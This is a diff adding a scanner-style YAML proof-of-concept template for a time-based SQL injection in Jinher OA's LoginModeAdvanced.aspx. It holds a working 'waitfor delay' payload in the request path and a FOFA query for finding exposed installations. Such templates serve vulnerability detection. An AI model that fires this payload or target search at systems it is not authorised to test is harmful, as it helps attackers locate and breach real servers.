@@ -1,0 +1,30 @@
+id: poc-yaml-jinher-loginmodeadvanced-aspx-sqli
+info:
+  name: 金和OA LoginModeAdvanced.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /c6/Jhsoft.Web.AddMenu/LoginModeAdvanced.aspx/?ID=1;waitfor+delay'0:0:{{.t1}}'
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"传统模式设置") &&
+
+    contains(gbk_decode(body),"登录图片设置") &&
+
+    contains(gbk_decode(body),"背景设置") &&
+
+    contains(body,"JHSoft") &&
+
+    duration >= t1 &&
+
+    duration <= t2
+
+    '
+transport: http
